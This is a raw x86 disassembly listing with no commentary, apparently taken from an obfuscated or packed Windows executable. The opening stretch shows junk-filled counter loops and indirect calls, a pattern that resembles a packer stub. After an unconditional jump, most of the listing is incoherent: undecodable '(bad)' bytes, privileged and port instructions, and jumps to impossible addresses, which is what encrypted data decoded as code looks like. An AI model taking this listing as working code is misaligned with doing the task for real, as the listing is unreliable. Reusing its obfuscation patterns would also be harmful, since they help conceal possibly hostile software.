  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	pop    eax
  4115ac:	mov    cl,0x7d
  4115ae:	mov    edx,0x7c7caf40
  4115b3:	inc    eax
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	cmp    DWORD PTR [eax-0x71],esi
  4115ba:	into   
  4115bb:	inc    ebp
  4115bc:	or     dh,ch
  4115be:	js     0x411564
  4115c0:	sar    ah,0xb
  4115c3:	jae    0x4115fc
  4115c5:	pop    ecx
  4115c6:	repz sbb BYTE PTR es:[esi],dh
  4115ca:	cmp    DWORD PTR [ecx-0x77],ebx
  4115cd:	mov    eax,ds:0xc94df9f3
  4115d2:	ja     0x411582
  4115d4:	pop    edi
  4115d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d6:	add    DWORD PTR [ebp+0x7e286d81],esp
  4115dc:	and    eax,0x6ec73e7a
  4115e1:	enter  0xe181,0x5e
  4115e5:	sar    BYTE PTR [ebp+0x4981c31e],cl
  4115eb:	jmp    0x3cea:0x3080422c
  4115f2:	mov    ch,0x2e
  4115f4:	jae    0x4115d1
  4115f6:	mov    al,ds:0x1ef79458
  4115fb:	daa    
  4115fc:	mov    ebx,edi
  4115fe:	adc    edx,DWORD PTR [edi+0x46a8b492]
  411604:	out    dx,eax
  411605:	addr16 mov ds:0x1e48,eax
  411609:	(bad)  
  41160a:	into   
  41160b:	data16 jle 0x41167f
  41160e:	(bad)  
  41160f:	jle    0x4115be
  411611:	inc    edi
  411612:	sbb    BYTE PTR [edi-0x317e1e73],bl
  411618:	test   al,0x4d
  41161a:	mov    al,ds:0x6cbc421c
  41161f:	cwde   
  411620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411621:	mov    ebx,0x5e7d63
  411626:	lods   al,BYTE PTR ds:[esi]
  411627:	xchg   esi,eax
  411628:	(bad)  
  411629:	repnz cwde 
  41162b:	addr16 dec edi
  41162d:	push   ds
  41162e:	jbe    0x411686
  411630:	mov    DWORD PTR [ecx+0x59],ebx
  411633:	je     0x41162a
  411635:	cwde   
  411636:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  411638:	mov    ecx,0x7003a9ca
  41163d:	imul   ebp,edx,0xffffffb0
  411640:	jno    0x411667
  411642:	dec    esi
  411643:	mov    BYTE PTR [esi-0x3d],bh
  411646:	jl     0x411633
  411648:	and    DWORD PTR [ebp-0x53d489dd],0xdbe5ab60
  411652:	sbb    ch,BYTE PTR [eax+edx*1+0x22]
  411656:	(bad)
  41165a:	sbb    edi,DWORD PTR [ebx+0xd]
  41165d:	push   es
  41165e:	xor    al,0x14
  411660:	sbb    BYTE PTR [edx-0x53],0xb
  411664:	mov    edi,0x110e16a
  411669:	sbb    ecx,ebx
  41166b:	addr16 mov ecx,0xc809ed0e
  411671:	inc    edx
  411672:	xchg   edi,eax
  411673:	mov    ah,BYTE PTR [ebp+eax*8+0x5a]
  411677:	push   ecx
  411678:	adc    ebp,DWORD PTR [ecx+0x1]
  41167b:	jnp    0x411623
  41167d:	icebp  
  41167e:	ja     0x4116e5
  411680:	gs push ss
  411682:	ret    
  411683:	(bad)  [eax-0x1880c546]
  411689:	clc    
  41168a:	inc    edi
  41168b:	imul   edx,DWORD PTR [esi+0x2e36819c],0xf5b89164
  411695:	jnp    0x4116fe
  411697:	push   ds
  411698:	adc    ecx,esp
  41169a:	fimul  WORD PTR [edi]
  41169c:	xor    ebp,0x3
  41169f:	mov    cl,0x8
  4116a1:	aam    0xe5
  4116a3:	fistp  WORD PTR [ebp+0x55945373]
  4116a9:	pusha  
  4116aa:	int    0x4e
  4116ac:	sti    
  4116ad:	cli    
  4116ae:	mov    ch,0x90
  4116b0:	cmp    edi,ebp
  4116b2:	sbb    DWORD PTR [esp+ebp*2],ecx
  4116b5:	enter  0x6510,0x7b
  4116b9:	sbb    BYTE PTR [ebx],0xae
  4116bc:	mov    edx,0xbd41fd8c
  4116c1:	cmp    ah,0x91
  4116c4:	add    al,0xc8
  4116c6:	sbb    DWORD PTR [esi],0x56
  4116c9:	cmp    DWORD PTR [edx+0x6877edcc],0x13b9eba4
  4116d3:	cs mov eax,0x38243826
  4116d9:	mov    ch,ch
  4116db:	retf   
  4116dc:	lods   eax,DWORD PTR ds:[esi]
  4116dd:	xor    DWORD PTR [edi+0x750b3fb4],eax
  4116e3:	das    
  4116e4:	pop    ecx
  4116e5:	cmp    al,BYTE PTR [esi]
  4116e7:	js     0x411702
  4116e9:	aaa    
  4116ea:	xchg   esp,eax
  4116eb:	ja     0x41174b
  4116ed:	xchg   edi,eax
  4116ee:	aaa    
  4116ef:	test   DWORD PTR [esi],esp
  4116f1:	mov    DWORD PTR [edi+edx*4],ecx
  4116f4:	inc    ebx
  4116f5:	push   esi
  4116f6:	mov    edx,0xec0062d8
  4116fb:	pusha  
  4116fc:	mov    al,BYTE PTR [eax]
  4116fe:	mov    al,0x17
  411700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411701:	aas    
  411702:	xchg   edx,eax
  411703:	pop    esi
  411705:	dec    edi
  411706:	cwde   
  411707:	sbb    al,0xf9
  411709:	stos   BYTE PTR es:[edi],al
  41170a:	vpunpckhbw xmm5,xmm3,xmm1
  41170e:	add    ebx,edi
  411710:	push   eax
  411711:	aad    0x4d
  411713:	test   al,0x79
  411715:	es xchg edx,eax
  411717:	sbb    eax,0x1f8c00ec
  41171c:	adc    eax,0xf8eb75f0
  411721:	xchg   edi,eax
  411722:	enter  0x6b41,0x7f
  411726:	out    0xa3,al
  411728:	fldpi  
  41172a:	stos   DWORD PTR es:[edi],eax
  41172b:	aas    
  41172c:	push   esp
  41172d:	sbb    esp,DWORD PTR [ebp+0xe01e7bd]
  411733:	pop    DWORD PTR [esi+0x28]
  411736:	jb     0x4116d0
  411738:	lods   eax,DWORD PTR ds:[esi]
  411739:	(bad)  
  41173a:	mov    ecx,0x6e4a28bd
  41173f:	gs dec ecx
  411742:	push   esp
  411743:	push   edx
  411744:	pop    DWORD PTR [eax]
  411746:	(bad)  
  411747:	jg     0x4117a7
  411749:	stos   DWORD PTR es:[edi],eax
  41174a:	jae    0x41176d
  41174c:	lahf   
  41174d:	fwait
  41174e:	retf   
  41174f:	xor    dh,0xab
  411752:	xor    esp,esi
  411754:	aam    0xde
  411756:	and    ebp,eax
  411758:	ret    0xf5ae
  41175b:	call   0x108e:0x7399ae50
  411762:	jmp    0x4011755c
  411767:	mov    ss,ebx
  411769:	or     dl,ch
  41176b:	imul   esp,DWORD PTR [ebx+0x28],0x99018973
  411772:	cmc    
  411773:	popf   
  411774:	and    al,0x59
  411776:	(bad)  
  411777:	push   ss
  411778:	adc    eax,0xa32bc578
  41177d:	adc    edi,esp
  41177f:	jecxz  0x4117a5
  411781:	and    eax,0x7d7b0167
  411786:	outs   dx,DWORD PTR ds:[esi]
  411787:	xor    eax,DWORD PTR [ecx+ebx*8-0x6c]
  41178b:	adc    cl,BYTE PTR [edi-0x74]
  41178e:	(bad)  
  41178f:	push   esi
  411790:	jo     0x411772
  411792:	or     esi,DWORD PTR [edx-0x73cb33a1]
  411798:	sub    DWORD PTR [ebx+0x5ef346da],eax
  41179e:	xlat   BYTE PTR ds:[ebx]
  41179f:	fbstp  TBYTE PTR [eax-0x25]
  4117a2:	mov    WORD PTR [ecx+0x4ef63f25],fs
  4117a8:	hlt    
  4117a9:	pop    ds
  4117aa:	xchg   edx,eax
  4117ab:	mov    al,0x77
  4117ad:	pop    ebp
  4117ae:	push   cs
  4117af:	sub    DWORD PTR [esi*4-0x40e15567],esp
  4117b6:	jg     0x411789
  4117b8:	sahf   
  4117b9:	retf   0x23c5
  4117bc:	mov    dl,0x3b
  4117be:	lock mov eax,ds:0x577d80f6
  4117c4:	add    ax,bx
  4117c7:	cdq    
  4117c8:	or     dh,BYTE PTR [esi]
  4117ca:	cmp    DWORD PTR [esi-0x30c5ea4f],0x46
  4117d1:	imul   ebp,DWORD PTR [esi+0x6b],0xffffff84
  4117d5:	int    0x49
  4117d7:	lahf   
  4117d8:	out    dx,eax
  4117d9:	mov    al,0xcd
  4117db:	push   ss
  4117dc:	jo     0x411767
  4117de:	ss jno 0x411774
  4117e1:	sbb    al,0xf5
  4117e3:	retf   0x9f73
  4117e6:	cli    
  4117e7:	push   ss
  4117e8:	adc    DWORD PTR [edi],ebx
  4117ea:	sbb    ebx,DWORD PTR [ecx]
  4117ec:	pop    ebx
  4117ed:	fadd   DWORD PTR [ecx+0x71]
  4117f0:	xchg   BYTE PTR [ebp-0x3e010d13],cl
  4117f6:	stos   BYTE PTR es:[edi],al
  4117f7:	fcomip st,st(4)
  4117f9:	ds out 0x6d,al
  4117fc:	dec    esp
  4117fd:	shl    DWORD PTR [edi+0x35],1
  411800:	pop    ss
  411801:	mov    dh,0xda
  411803:	pop    es
  411804:	rol    BYTE PTR [ebx-0x2f],1
  411807:	fcom   st(4)
  411809:	xchg   ecx,eax
  41180a:	jle    0x4117bb
  41180c:	and    DWORD PTR [eax+0x38],esi
  41180f:	call   0xaaefcab0
  411814:	xor    BYTE PTR [ecx+0x31d6f6e7],dl
  41181a:	mov    dl,al
  41181c:	sbb    ebp,DWORD PTR [esi+0x3e]
  41181f:	jmp    0xc155:0xa28d6ea6
  411826:	stos   DWORD PTR es:[edi],eax
  411827:	fidivr WORD PTR [ecx-0x181489ba]
  41182d:	scas   al,BYTE PTR es:[edi]
  41182e:	lea    ebx,[eax+ecx*1+0x5869555e]
  411835:	push   esp
  411836:	stc    
  411837:	in     al,dx
  411838:	dec    edi
  411839:	sbb    eax,0xe882508b
  41183e:	mov    cs:0xa9879a2,eax
  411844:	pop    edx
  411845:	aas    
  411846:	ins    BYTE PTR es:[edi],dx
  411847:	inc    edx
  411848:	dec    ebx
  411849:	inc    edx
  41184a:	adc    edx,DWORD PTR [ecx-0x48ee6de8]
  411850:	mov    ds:0x24281bda,eax
  411855:	scas   al,BYTE PTR es:[edi]
  411856:	fmul   QWORD PTR [ecx+0x33]
  411859:	inc    ebp
  41185a:	and    eax,0x62b55f64
  41185f:	sub    esi,DWORD PTR [esi+0x31]
  411862:	jecxz  0x411839
  411864:	or     BYTE PTR [ecx],bh
  411866:	push   esi
  411867:	adc    DWORD PTR [ebx-0x37],esi
  41186a:	rcl    BYTE PTR [ebp-0x33],cl
  41186d:	enter  0x9842,0x54
  411871:	jge    0x41185f
  411873:	in     al,dx
  411874:	hlt    
  411875:	mov    bh,0x0
  411877:	stc    
  411878:	mov    dl,BYTE PTR [edx+0x6cebb826]
  41187e:	int    0x5a
  411880:	loopne 0x4118c6
  411882:	mov    esi,DWORD PTR [esi+ebx*4-0x10fd479]
  411889:	jo     0x4118e2
  41188b:	mov    ah,BYTE PTR [ecx]
  41188d:	js     0x411821
  41188f:	xchg   esp,eax
  411890:	arpl   cx,bx
  411892:	cld    
  411893:	(bad)  
  411895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411896:	data16 sti 
  411898:	cdq    
  411899:	cmp    eax,DWORD PTR [edx-0x55]
  41189c:	ins    DWORD PTR es:[edi],dx
  41189d:	sbb    esp,eax
  41189f:	scas   eax,DWORD PTR es:[edi]
  4118a0:	add    eax,0xf5d5b1c1
  4118a5:	or     al,0xdb
  4118a7:	retf   
  4118a8:	sti    
  4118a9:	dec    esp
  4118aa:	retf   0x7408
  4118ad:	jg     0x41189f
  4118af:	add    al,0xb1
  4118b1:	stc    
  4118b2:	les    eax,FWORD PTR [ecx+0x4960dd6e]
  4118b8:	sbb    bl,dh
  4118ba:	imul   eax,DWORD PTR [esi+0x4b],0xf5b16e10
  4118c1:	and    al,0xb0
  4118c3:	dec    edx
  4118c4:	mov    ch,0x6
  4118c6:	in     al,0xf0
  4118c8:	or     eax,0x52b238ab
  4118cd:	xlat   BYTE PTR ds:[ebx]
  4118ce:	ret    
  4118cf:	popa   
  4118d0:	loopne 0x4118a3
  4118d2:	(bad)  
  4118d4:	divps  xmm1,XMMWORD PTR [edx-0x8d12671]
  4118db:	aaa    
  4118dc:	nop
  4118dd:	xchg   ebp,eax
  4118de:	lock sbb ax,WORD PTR [ecx+0x2b654892]
  4118e6:	fadd   st,st(1)
  4118e8:	dec    ebx
  4118e9:	int    0x1e
  4118eb:	fs jne 0x41192c
  4118ee:	dec    edx
  4118ef:	psubsw mm2,QWORD PTR [ebx-0x39]
  4118f3:	mov    al,0xf9
  4118f5:	lea    eax,[eax]
  4118f7:	sbb    BYTE PTR [edi],0xff
  4118fa:	and    BYTE PTR [ecx],cl
  4118fc:	sbb    al,BYTE PTR [edx-0x7a]
  4118ff:	popa   
  411900:	(bad)  
  411902:	sub    eax,0xd3535caf
  411907:	mov    eax,0x5a190386
  41190c:	cmp    ch,BYTE PTR [edi+eax*4+0x297fd9c2]
  411913:	push   edi
  411914:	inc    esi
  411915:	adc    DWORD PTR [edi+edx*8+0x11],esp
  411919:	jmp    FWORD PTR [ebx+0x50]
  41191c:	sub    ebx,DWORD PTR [esi-0x21]
  41191f:	jb     0x411987
  411921:	pop    edx
  411922:	pop    edx
  411923:	jo     0x41199d
  411925:	dec    ecx
  411926:	adc    dh,BYTE PTR gs:[edx+0x58f6220f]
  41192d:	mov    ah,0xd9
  41192f:	push   esp
  411930:	xchg   ecx,eax
  411931:	outs   dx,BYTE PTR ds:[esi]
  411932:	mov    DWORD PTR [ebp-0x6a42b3f],ebx
  411938:	dec    edx
  411939:	in     eax,dx
  41193a:	jge    0x411947
  41193c:	jl     0x411955
  41193e:	shl    DWORD PTR [ecx],cl
  411940:	sub    dh,ah
  411942:	push   0xf948127d
  411947:	pop    esi
  411948:	ds jae 0x4118f1
  41194b:	retf   
  41194c:	mov    DWORD PTR [edx+0x3e0f0472],ebx
  411952:	lds    edi,FWORD PTR [esi+0x7a]
  411955:	arpl   bp,cx
  411957:	out    0xad,eax
  411959:	xlat   BYTE PTR ds:[ebx]
  41195a:	add    ah,BYTE PTR [ebx+0x39bd0ba6]
  411960:	cdq    
  411961:	into   
  411962:	or     BYTE PTR [edx+0x0],al
  411965:	(bad)  
  411966:	xchg   ebx,eax
  411967:	repnz add DWORD PTR [eax],0xffffff84
  41196b:	add    BYTE PTR [esi-0x50],ah
  41196e:	push   eax
  41196f:	pop    DWORD PTR [esi]
  411971:	or     DWORD PTR [esi],edi
  411973:	adc    al,0xf6
  411975:	idiv   DWORD PTR [esi]
  411977:	push   cs
  411978:	xlat   BYTE PTR ds:[ebx]
  411979:	cwde   
  41197a:	mov    al,ds:0xc2c38a5c
  41197f:	loop   0x4119d2
  411981:	jb     0x41197c
  411983:	add    DWORD PTR [ebx-0x5bd484d8],ebx
  411989:	mov    ds:0xd0528854,al
  41198e:	sahf   
  41198f:	lahf   
  411990:	mov    ebp,0x62c36126
  411995:	rcr    BYTE PTR [edx-0x2b],1
  411998:	dec    edx
  411999:	iret   
  41199a:	fisubr WORD PTR [ecx+0x45716140]
  4119a0:	jp     0x411932
  4119a2:	in     eax,dx
  4119a3:	jno    0x411969
  4119a5:	out    dx,eax
  4119a6:	jg     0x4119ea
  4119a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a9:	cdq    
  4119aa:	test   al,0xd5
  4119ac:	inc    esi
  4119ad:	or     BYTE PTR ds:0x8edc391e,0x26
  4119b4:	and    DWORD PTR [eax],esi
  4119b6:	clc    
  4119b7:	pop    ebx
  4119b8:	lods   al,BYTE PTR ds:[esi]
  4119b9:	pop    edi
  4119ba:	jle    0x4119b8
  4119bc:	mov    DWORD PTR cs:[ebx+0x6253fd97],eax
  4119c3:	(bad)  
  4119c4:	mov    ebp,0x284fb54a
  4119c9:	jecxz  0x411a2c
  4119cb:	mov    ch,0x90
  4119cd:	sub    eax,0x5009f9e6
  4119d2:	call   esi
  4119d4:	ja     0x4119e1
  4119d6:	fistp  WORD PTR [ebp-0x52]
  4119d9:	pop    ds
  4119da:	or     bh,BYTE PTR [ebx-0x57c4c3f4]
  4119e0:	icebp  
  4119e1:	nop
  4119e2:	sbb    esi,DWORD PTR [edx-0x68]
  4119e5:	mov    dl,0x7e
  4119e7:	(bad)  
  4119e9:	and    eax,0x57ad1cab
  4119ee:	push   eax
  4119ef:	sar    DWORD PTR [edx+0x5d],cl
  4119f2:	push   esi
  4119f3:	jne    0x4119bf
  4119f5:	xchg   ecx,eax
  4119f6:	and    ebp,edx
  4119f8:	(bad)  
  4119f9:	jge    0x41198a
  4119fb:	pop    ebx
  4119fc:	cli    
  4119fd:	aam    0x53
  4119ff:	xlat   BYTE PTR fs:[ebx]
  411a01:	dec    edx
  411a02:	outs   dx,BYTE PTR ds:[esi]
  411a03:	mov    ds:0x6a68bde,eax
  411a08:	fdivr  DWORD PTR [ecx]
  411a0a:	rol    BYTE PTR [edx+ebp*8+0x56],1
  411a0e:	loopne 0x411a02
  411a10:	gs cwde 
  411a12:	xchg   DWORD PTR [ebp+esi*2+0xd],esp
  411a16:	aad    0x2a
  411a18:	out    0xb6,al
  411a1a:	(bad)  
  411a1b:	call   0xee0d:0x70144657
  411a22:	outs   dx,DWORD PTR ds:[esi]
  411a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a24:	std    
  411a25:	loope  0x411a2c
  411a27:	inc    edx
  411a28:	retf   
  411a29:	xchg   edx,eax
  411a2a:	cld    
  411a2b:	push   ebp
  411a2c:	pop    ss
  411a2d:	fisttp WORD PTR [edi]
  411a2f:	sbb    al,0x32
  411a31:	loop   0x411a56
  411a33:	(bad)  
  411a34:	(bad)  
  411a36:	jecxz  0x4119fd
  411a38:	jge    0x411a3e
  411a3a:	xchg   ecx,eax
  411a3b:	pop    esp
  411a3c:	hlt    
  411a3d:	rep movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  411a40:	push   es
  411a41:	fs inc eax
  411a43:	out    dx,al
  411a44:	and    al,0x88
  411a46:	xchg   edi,eax
  411a47:	sub    edx,ebp
  411a49:	sbb    esi,esi
  411a4b:	test   al,0x2f
  411a4d:	ja     0x411a59
  411a4f:	sub    BYTE PTR [esi-0x774210bb],ch
  411a55:	mov    bl,0xc4
  411a57:	pop    esi
  411a58:	int    0xea
  411a5a:	lods   al,BYTE PTR ds:[esi]
  411a5b:	fistp  QWORD PTR [esi-0x5b27456a]
  411a61:	scas   eax,DWORD PTR es:[edi]
  411a62:	mov    dl,0x71
  411a64:	shl    dh,1
  411a66:	or     BYTE PTR [ecx+0x7d],dl
  411a69:	dec    ebx
  411a6a:	je     0x411acd
  411a6c:	sub    al,0x9b
  411a6e:	daa    
  411a6f:	push   esp
  411a70:	fldenv [edx+0x59]
  411a73:	imul   esi,edx,0xffffffcc
  411a76:	jl     0x411a77
  411a78:	dec    edi
  411a79:	add    DWORD PTR [edx+0x5957dd03],0xfffffffd
  411a80:	xchg   edx,eax
  411a81:	shl    BYTE PTR [edi-0x60ba9bc6],1
  411a87:	inc    esp
  411a88:	mov    ds:0x9d935420,al
  411a8d:	aaa    
  411a8e:	sub    BYTE PTR [esi],dl
  411a90:	repnz mov dh,0x9d
  411a93:	cdq    
  411a94:	loopne 0x411a91
  411a96:	daa    
  411a97:	mov    ds:0xf9d93799,eax
  411a9c:	test   al,0x54
  411a9e:	pusha  
  411a9f:	xchg   ebx,eax
  411aa0:	outs   dx,BYTE PTR ds:[esi]
  411aa1:	popa   
  411aa2:	shl    DWORD PTR [ebp-0x3e1e4529],1
  411aa8:	retf   
  411aa9:	stc    
  411aaa:	mov    dh,ah
  411aac:	xlat   BYTE PTR ds:[ebx]
  411aad:	cmc    
  411aae:	inc    esp
  411aaf:	xchg   BYTE PTR [eax-0xefe46b1],bh
  411ab5:	push   ebp
  411ab6:	adc    edi,esp
  411ab8:	xchg   edx,eax
  411ab9:	daa    
  411aba:	mov    dh,0xd
  411abc:	push   edi
  411abd:	out    0x57,al
  411abf:	mov    eax,0x28cafc9f
  411ac4:	sub    al,0x13
  411ac6:	loopne 0x411b40
  411ac8:	call   0xa06b:0xf5f88f26
  411acf:	test   al,0x9a
  411ad1:	loope  0x411b34
  411ad3:	mov    ebp,0xf6929cde
  411ad8:	jmp    0x488753bd
  411add:	leave  
  411ade:	sub    edi,ebp
  411ae0:	dec    edi
  411ae1:	fld    DWORD PTR [edi-0x56c8b4ae]
  411ae7:	sbb    al,dh
  411ae9:	lods   eax,DWORD PTR ds:[esi]
  411aea:	ret    
  411aeb:	jecxz  0x411ab4
  411aed:	das    
  411aee:	out    0xb5,al
  411af0:	push   es
  411af1:	daa    
  411af2:	xchg   ebp,eax
  411af3:	mov    ebx,0xc55d38a6
  411af8:	mov    bh,0xaa
  411afa:	cld    
  411afb:	stos   BYTE PTR es:[edi],al
  411afc:	xor    eax,0x8b540b27
  411b01:	cmp    BYTE PTR [edi+0xf33dac8],cl
  411b07:	xchg   ebp,eax
  411b08:	adc    eax,0xf915d3c7
  411b0d:	cld    
  411b0e:	xor    ecx,0xffffffa2
  411b11:	(bad)  
  411b12:	imul   eax,DWORD PTR [eax+0x7c350a0c],0x8c9cc1ed
  411b1c:	inc    edx
  411b1d:	add    ah,BYTE PTR [edx-0x49]
  411b20:	adc    ebp,DWORD PTR [esi]
  411b22:	cdq    
  411b23:	add    cl,dh
  411b25:	rol    BYTE PTR [edx+0x29483c3],0xb0
  411b2c:	lahf   
  411b2d:	inc    ebx
  411b2e:	sti    
  411b2f:	sar    eax,1
  411b31:	add    eax,0xf5153b63
  411b36:	inc    ecx
  411b37:	sbb    eax,0xc8ec5d11
  411b3c:	add    BYTE PTR [eax+edi*4],bl
  411b3f:	pop    es
  411b40:	lea    ecx,[edx+edi*4]
  411b43:	push   edx
  411b44:	sub    al,BYTE PTR [eax+0x6552ff32]
  411b4a:	jns    0x411b3a
  411b4c:	shr    BYTE PTR [ecx+0x279788ee],cl
  411b52:	nop
  411b53:	(bad)  
  411b54:	cmp    esp,DWORD PTR [ebp+0x28badb9a]
  411b5a:	fdiv   DWORD PTR [edx-0x1de73b27]
  411b60:	ins    DWORD PTR es:[edi],dx
  411b61:	int3   
  411b62:	imul   edx,DWORD PTR [eax],0x7350a999
  411b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b69:	aaa    
  411b6a:	clc    
  411b6b:	jp     0x411b80
  411b6d:	mov    ah,0x93
  411b6f:	jge    0x411bde
  411b71:	bound  ebx,QWORD PTR [edx+0x56]
  411b74:	mov    cl,0x2c
  411b76:	arpl   WORD PTR [edi+0x5e],ax
  411b79:	pop    eax
  411b7a:	cmp    eax,0xb4de9d6d
  411b7f:	pop    DWORD PTR [ebx]
  411b81:	gs pusha 
  411b83:	neg    BYTE PTR [edx+esi*2]
  411b86:	sub    edx,DWORD PTR ds:0xb7b52278
  411b8c:	stos   BYTE PTR es:[edi],al
  411b8d:	cmc    
  411b8e:	and    al,0x9b
  411b90:	int    0xbb
  411b92:	xchg   edi,eax
  411b93:	push   cs
  411b94:	shl    BYTE PTR [edi+0x39f52447],cl
  411b9a:	stos   BYTE PTR es:[edi],al
  411b9b:	and    al,0xa
  411b9d:	sbb    dh,BYTE PTR [eax-0x56]
  411ba0:	(bad)  
  411ba2:	into   
  411ba3:	mov    edi,0xe85918ec
  411ba8:	rcr    DWORD PTR [edx+esi*2+0x62],0xac
  411bad:	mov    ds:0x83d272ab,al
  411bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb3:	ret    0xb0df
  411bb6:	push   cs
  411bb7:	or     BYTE PTR [edi+0x6b],0x4a
  411bbb:	mov    edx,0x5ae911b1
  411bc0:	imul   BYTE PTR [ebp*2-0x1eb58210]
  411bc7:	add    al,0x27
  411bc9:	or     BYTE PTR [ebp+eiz*2-0x6a6de937],al
  411bd0:	and    BYTE PTR ds:0xe118d1d1,bl
  411bd6:	mov    eax,ds:0xbc92e13e
  411bdb:	mov    al,ds:0x570c1d52
  411be0:	hlt    
  411be1:	fnsave [ebp+0xd]
  411be4:	rcl    DWORD PTR [edi+0x75],cl
  411be7:	jns    0x411bf7
  411be9:	jbe    0x411c11
  411beb:	lea    esp,[ecx]
  411bed:	push   es
  411bee:	imul   ebp,edi,0x8c14b259
  411bf4:	test   al,0xbd
  411bf6:	push   eax
  411bf7:	(bad)  
  411bf8:	add    ah,dh
  411bfa:	mov    dl,0xf2
  411bfc:	(bad)  
  411bfd:	push   0x3
  411bff:	inc    ecx
  411c00:	cmp    eax,0x189d5540
  411c05:	int3   
  411c06:	adc    ecx,0x44af93eb
  411c0c:	mov    BYTE PTR ds:0xde351652,ah
  411c12:	push   edi
  411c13:	or     eax,0x1471a95a
  411c18:	jb     0x411bdc
  411c1a:	fsub   QWORD PTR [eax]
  411c1c:	fsub   st(4),st
  411c1e:	ja     0x411c04
  411c20:	sub    ah,BYTE PTR [edx+eax*4-0x6f11a43b]
  411c27:	add    al,0x1b
  411c29:	(bad)  
  411c2a:	inc    BYTE PTR [ebx+0x6900e1ef]
  411c30:	fdiv   DWORD PTR [ebp+ebx*2+0x35]
  411c34:	push   edx
  411c35:	mov    bh,0xb1
  411c37:	not    DWORD PTR [esi]
  411c39:	adc    esp,DWORD PTR [edx-0x48]
  411c3c:	fidiv  DWORD PTR ds:0x7e1257d3
  411c42:	mov    eax,ds:0x4f4118f8
  411c47:	dec    ecx
  411c48:	je     0x411c2d
  411c4a:	scas   al,BYTE PTR es:[edi]
  411c4b:	mov    ch,0xa2
  411c4d:	add    eax,0xa03ddce0
  411c52:	mov    al,0x8a
